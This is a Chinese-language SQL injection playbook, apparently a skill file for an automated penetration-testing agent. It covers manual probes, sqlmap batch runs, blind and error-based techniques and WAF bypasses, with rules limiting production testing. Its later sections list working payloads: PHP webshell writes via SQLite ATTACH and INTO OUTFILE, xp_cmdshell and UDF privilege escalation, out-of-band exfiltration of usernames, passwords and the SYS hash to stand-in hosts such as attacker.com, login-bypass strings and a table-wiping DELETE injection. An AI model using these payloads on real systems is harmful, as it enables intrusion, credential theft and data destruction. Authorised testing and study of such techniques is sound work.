---
id: sqli-deep
title: SQL 注入深度手册（联合/布尔/时间/报错/堆叠/NoSQL）
tags: sqli,sqlmap,注入,布尔,时间,waf,s4
---
# SQL 注入深度手册

> 前置：load_skill injection-points（入口完整性）+ oob-interactsh（盲注回连通道）。一切结论以「基线 vs 变异」单变量对比为准；**生产数据只做存在性证明（count/version/单行），不批量下载**。

## 一、手工探针链（先于 sqlmap，落 evidence/）

```bash
# 数字型布尔：响应长度差异两次确认
?id=1 AND 1=1  vs  ?id=1 AND 1=2
# 字符型闭合探测：' / " / ') / %' 逐个试闭合，报错页半截语句记入假设
# 时间型（MySQL/MSSQL/Oracle/PG 差异）
?id=1 AND SLEEP(4)-- vs ?id=1 AND SLEEP(0)--
?id=1; WAITFOR DELAY '0:0:4'--
# 算术求值（无报错回显时）
?id=(SELECT 3-1)   # 响应回到 id=2 的内容 = 确证注入
# 堆叠探测（是否支持多语句，影响后渗透路径）
?id=1; SELECT 1--
```

## 二、sqlmap 受控使用

```bash
# 探测（--batch 只做无害判据，禁 --os-shell/--file-write 直达利用）
sqlmap -u "https://目标/api?id=1" --batch --level 2 --risk 1 --threads=1 --delay=1 \
       --technique=BEUST --output-dir evidence/sqlmap/
# 命中后：--current-user --current-db --count -T users  （存在性证明）
# 数据提取属生产数据触碰 → 仅演示 1 行（hash/前缀），批量导出禁止
# 利用类动作（os-shell/写文件/提权）→ record_finding 后转 S5 审批，不在 s4 执行
```

- tamper 按目标数据库+拦截特征选（见 waf-fingerprint）：`space2comment/charencode/between` 等，一次只叠一个。
- `--flush-session` 重测前清缓存；`-r request.txt` 直接吃 Burp 原文（与证据口径一致）。

### 自动化批量扩展（v3.9.2，防「手工确证 N 个只深验 1-2 个」）

实测教训：手工探针确证 6 个注入端点，sqlmap 只跑了 2 个（其余停留在手工延时确认层面，无结构化提取）。**手工探针确证/疑似 ≥2 个端点后，必须批量过 sqlmap（批量提取属 L2 审批级——与 web-top10 A03 口径一致；--batch 无害判定探针 L0 可先行）**：

```bash
# 批量模式一：URL 列表（每个确证/疑似端点一行，含参数）
sqlmap -m evidence/sqli-endpoints.txt --batch --level 2 --risk 1 --threads=1 --delay=1 \
       --technique=BEUST --banner --current-user --current-db --is-dba --output-dir evidence/sqlmap/
# 批量模式二：单端点多参数/-r 逐个跑，同一套提取清单
```

- 统一提取清单（每端点四件套）：`--banner --current-user --current-db --is-dba`；命中库表再加 `--tables --count`（存在性证明口径）。
- 绕过型端点（宽字节/base64/过滤空格等）用 `--prefix/--suffix` 或 tamper 显式表达绕过形态（如 GBK 宽字节用手工构造 `%bf%27` 前缀；**sqlmap 无 `unescapebyhex` 这个内置 tamper 脚本，勿照抄**——按目标过滤特征写自定义 tamper 或手工请求），批量跑不出时手工闭环并注明差异。
- 限速纪律不变（--threads=1 --delay≥0.5）；每个端点的 sqlmap 结论 update_coverage 归账（notes 引用 evidence/sqlmap/ 输出文件）。

## 三、专项形态

- **报错注入**：extractvalue/updatexml/datatype 错误，只取 @@version 与 db name 证明。
- **NoSQL**：`{"$ne":null}` / `?q[$regex]=.*`（MongoDB 语法报错=确证）；`|| "1"== "1"`（node mongoids）。
- **二次注入**：注册/资料修改处写入 payload，遍历到回显位（搜索/导出）观察——覆盖矩阵单独登记。
- **宽字节/编码**：%bf%27（GBK）、`%2527`（双重 URL 编码）按响应行为逐一试。

## 四、纪律

- 同一注入点失败反馈环：waf_blocked（记拦截特征→waf-fingerprint 换策略重试一次）/ patched / premise_failed，禁止同参数重试超 2 次。
- 确证 → record_finding（附 cwe-89、注入类型、可提取范围）；疑似 → evidence 留痕转 hypothesis-0day 差异验证。

## 冷门库与扩展技术

- **SQLite ATTACH 写文件**：`ATTACH DATABASE '/var/www/html/x.php' AS pwn; CREATE TABLE pwn.cmd(data text); INSERT INTO pwn.cmd VALUES('<?php system($_GET[c]);?>');` → webshell/crontab；无 SLEEP 时时间盲注：`LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`
- **MySQL Windows SMB 外带**：`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\share'))` + Responder 抓 NTLMv2
- **INSERT/UPDATE 注入差异**：INSERT 多行 VALUES 把密码写进可见日志表；UPDATE `'), admin=1 WHERE username='victim'--`
- **CTF 八技术**：`handler` 绕 SELECT 过滤；`PREPARE+0x` hex 绕关键字；`mysql.innodb_table_stats` 绕 information_schema；无列名注入 ``SELECT `1` FROM (...UNION SELECT * FROM target)a``；双写 `uunionnion`；XOR 盲注 `1^(ascii(substr(...))>100)^1`；`PIPES_AS_CONCAT`
- **冷门库**：DB2（FETCH FIRST/QSYS2.QCMDEXC/笛卡尔积延时）、Cassandra（ALLOW FILTERING）、BigQuery（反引号/除零报错/无 SLEEP）
- **注入点扩展**：JSON **key 名**、multipart filename、ORDER BY/sort/desc/limit/表名列名（预编译盲区）
- **工作流增量**：APP 测试把所有功能点点一遍后回看抓包历史，`xx_xx_id` 命名 POST 参数（尤其最后一个）逐个单引号；exp(709) 正常/exp(710) 报错做免报错探测；有 WAF 找真实 IP 直连

### 报错指纹路由表（各库秒判）
`You have an error in your SQL syntax`→MySQL；`Microsoft OLE DB Provider`→MSSQL；`PG::`→PostgreSQL；`ORA-`→Oracle；SQLite 报错→布尔/UNION。各库元数据指纹：MySQL `@@datadir`/`@@global.secure_file_priv`（读写文件前置判据）、Oracle `banner FROM v$version`、MSSQL `DB_NAME()`、PG `current_database()`。

### UNION 三步与各库语法
`ORDER BY N--` 递增至报错=N-1 列 → `UNION SELECT NULL,NULL,NULL--` → 字符串列定位（`'a',NULL,NULL`）；拼接：MySQL `CONCAT(u,0x3a,p)` / MSSQL `u+'|'+p` / Oracle `u||'|'||p` / PG `u||':'||p`。时间盲注补全：PG `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`；字符型 `'||(SELECT pg_sleep(5))--`；Oracle 无 SLEEP：`1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)` 或 `dbms_pipe.receive_message(('a'),5)`。

### OOB 全载荷（MSSQL/Oracle）
MSSQL OpenRowSet 走 80/443 绕出网限制并带数据：`'; INSERT INTO OPENROWSET('SQLOLEDB','DRIVER={SQL Server};SERVER=atk,80;UID=sa;PWD=p','SELECT * FROM foo') SELECT TOP 1 username+':'+password FROM users--`。Oracle：`'+UTL_HTTP.REQUEST('http://atk/'||(SELECT username FROM all_users WHERE ROWNUM=1))--`；DNS 带数据 `'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.atk.com')--`；`DBMS_LDAP.INIT(...,389)`。

### v5.6.0 执行档边界统一（审计修复：主体纪律与扩展内容分层）

本手册**前半部**（基线对照/布尔/时间/堆叠探针/盲注裁决）= 检测与确证手法，production_safe 可执行（受审批矩阵约束）；**后半部的 INTO OUTFILE/webshell 写入/UDF/xp_cmdshell 提权配方** = 实验室利用手法，**仅 isolated_lab 执行**（production_safe 下引擎逐动作强制拦截，引用时仅作为"影响上限说明"写进报告，不投递）。存在性证明口径：布尔/时间/UNION 读三通道任一确证即止——数据外带(读敏感表)按 ROE 数据最小化纪律限额，**写文件/提权在生产目标一律不做**（生产档 RCE 类动作转 S5 审批且通常仅做"影响说明"）。

### INTO OUTFILE 与提权四路（isolated_lab 限定）
`SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/x.php'` 前提=FILE 权限+web 根可写+`@@global.secure_file_priv=''`（先探）。提权：MSSQL `sp_configure 'show advanced options',1;RECONFIGURE;sp_configure 'xp_cmdshell',1;RECONFIGURE`；COM 自动化 `sp_OACreate 'wscript.shell'`；MySQL UDF `CREATE FUNCTION...SONAME`；Oracle `dbms_java.grant_permission`。

### 预编译盲区补两场景与 WAF 手工变体
部分参数化：`WHERE type='" + userType + "' AND id=?`（type 拼接）；IN 子句只参数化最后一个。WAF 手工变体：逗号滤→`UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c`、`SUBSTRING('abc' FROM 1 FOR 1)`、`LIMIT 1 OFFSET 0`；= 滤→`LIKE 1`/`REGEXP '^1$'`/`BETWEEN 1 AND 1`；引号滤→`0x61646D696E`/`CHAR(97,100,109,105,110)`；Polyglot `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`；Unicode 引号 U+02BA/U+02B9；PDO `ATTR_EMULATE_PREPARES=true` 时仍可堆叠。框架形态：ThinkPHP5 `updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)`；Django GIS CVE-2020-9402。CTF 补两招：表改名 `ALTER TABLE flag RENAME TO words; ALTER TABLE words ADD COLUMN id INT DEFAULT 1;`；group_concat 被滤→`SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x`。DELETE 位注入 `1' OR '1'='1`→全表删除（破坏判据）；**同一端点四动词全测**（GET→SELECT/POST→INSERT/PUT→UPDATE/DELETE→DELETE）。登录绕过 payload 族（legacy ORM 必测，逐字段单独测）：`admin'--`、`' OR '1'='1'--`、`admin' OR 'a'='a`、`1 or 1=1`。
## v4.8 M6 工具通道兼容性声明

> 口径（loop-core v4.8 纪律 3）：先 probe 后 batch——每个外部工具对目标首次使用前先用小样本探针确认可用性，探针被拦/挂起先切适配通道再批量；探针结果写入交付物工具声明小节。各工具在「挑战型 WAF / 封闭站」下的可用性与适配通道：

- sqlmap：注入流量无会话态会被挑战型 WAF 拦截（假阴性）——先 probe（--level 1 单参数）确认可达；适配通道：挑战态 cookie/UA 注入（--cookie/--headers），或经注入通道（mitmproxy↔CDP 上游代理链）带挑战态运行。
- curl：低频手工请求始终可用——也是挑战态复放的最小工具（channel-snapshot 快照 cookie/UA 复放）；禁用它做大批量枚举。

## v4.8 W6 注入通道增补（挑战态运行 + 盲注三通道裁决）

- **注入通道标准件**：挑战型 WAF 下 sqlmap/nuclei 带挑战态运行——`python3 /opt/tools/chain-proxy.py --from-snapshot evidence/channel-snapshot-<ts> --emit --url <URL>` 输出就绪参数；或 `--serve 127.0.0.1:8099 --upstream <目标>` 启动上游代理链后 sqlmap `--proxy http://127.0.0.1:8099`（mitmproxy↔CDP 链的轻量标准件，cookie/UA/挑战头自动注入）。先 probe（--level 1 单参数）后 batch。
- **盲注三通道自动裁决**：`python3 /opt/tools/blind-inject-adjudicator.py --url '<模板,{}=payload位>' --true-payload '…' --false-payload '…'`——布尔（true≈基线且 false 可区分）/时延（三重测中位数过阈值）/带外（OOB 建议走 oob-interactsh 本机反链）自动裁决并给下一步建议；存在性证明口径。
- **二阶注入追踪**：输入落库→取出重渲染位（stored 面）按 xss-context 二阶载荷思路追踪；落库点与回显点成对登记 update_coverage。
